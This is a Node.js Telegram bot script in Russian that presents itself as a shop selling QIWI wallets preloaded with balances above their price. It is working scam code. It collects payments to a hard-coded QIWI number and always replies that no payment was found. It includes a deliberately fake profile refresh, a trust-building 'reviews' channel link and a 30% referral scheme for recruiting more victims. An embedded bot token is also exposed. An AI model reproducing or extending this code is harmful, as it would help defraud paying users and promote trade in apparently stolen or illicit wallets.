const TOKEN = "1499651443:AAHErwhrP37G60S6oU5t-pi8385245VdVe8";
const NUMBER = "79627753469";
const CHANNEL_USERNAME = "alchbomber_channel";
const BOT_USERNAME = "alchwallet_bot";

const menu = {
	start: [
		["➕ Доступные кошельки", "🖥 Профиль"],
		["🅾️ Отзывы", "👥 Партнёры"]
	],
	wallets: [
		["👛 99 рублей", "👛 149 рублей"],
		["💼 499 рублей"],
		["✖️ Меню"]
	]
}

const Telegram = require("node-telegram-bot-api");
const bot = new Telegram(TOKEN, {
	polling: true
});

bot.on("message", async (message) => {
	if(!message.text) return;
	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);

	if(message.text.startsWith("/start") || message.text === "✖️ Меню") {
		return message.send("🔺 Добро пожаловать в бот по продаже QIWI кошельков!", {
			reply_markup: {
				keyboard: menu.start,
				resize_keyboard: true
			}
		});
	}

	if(message.text === "➕ Доступные кошельки") {
		return message.send(`Добро пожаловать, выбирайте кошельки на любой вкус!
		
99 рублей: баланс от 300 рублей
149 рублей: баланс от 700 рублей
499 рублей: баланс от 1500 рублей`, {
			reply_markup: {
				keyboard: menu.wallets,
				resize_keyboard: true
			}
		});
	}

	if(message.text === "👛 99 рублей" || message.text === "👛 149 рублей" || message.text === "💼 499 рублей") {
		let amount = message.text === "👛 99 рублей" ? "99" : message.text === "👛 149 рублей" ? "149" : "499";
		return message.send(`Для получения товара оплатите этот товар.
В данный момент у нас есть только один способ оплаты - это QIWI.

📲 QIWI для оплаты: <code>${NUMBER}</code>
💵 Сумма: ${amount}₽
🗒 Комментарий для оплаты: <code>${message.from.id}</code>`, {
			parse_mode: "HTML",
			reply_markup: {
				inline_keyboard: [
					[
						{ text: "🔄 Подтвердить оплату", callback_data: "confirm" }
					]
				]
			}
		});
	}

	if(message.text === "🖥 Профиль") {
		return message.send(`📝 ID: ${message.from.id}
🛒 Покупки: отсутствует`, {
			reply_markup: {
				inline_keyboard: [
					[
						{ text: "🔄 Обновить информацию", callback_data: "fakerefresh" }
					]
				]
			}
		});
	}

	if(message.text === "🅾️ Отзывы") {
		return message.send(`Не верите, что мы честный бот по продаже кошельков?
Вы можете просмотреть отзывы покупателей и убедиться, что мы честные.`, {
			reply_markup: {
				inline_keyboard: [
					[
						{ text: "🅾️ Отзывы", url: `https://t.me/${CHANNEL_USERNAME}` }
					]
				]
			}
		});
	}

	if(message.text === "👥 Партнёры") {
		return message.send(`Не хотите покупать QIWI кошельки?
Вы можете привлекать людей и получать процент от их покупок.

▫️ От 1 покупки реферала: 30%

По статистике каждый 5 в нашем боте покупает QIWI кошельки.
Из 10 привлечённых людей 2 точно будут покупать кошельки.

Ваша реферальная ссылка: https://t.me/${BOT_USERNAME}?start=${message.from.id}`);
	}
});

bot.on("callback_query", async (query) => {
	if(query.data === "confirm") {
		bot.sendMessage(query.message.chat.id, "Оплата не найдена, проверьте наличие комментария к платежу.");
	}

	if(query.data === "fakerefresh") {
		bot.answerCallbackQuery(query.id, "Профиль обновлён.");
	}
});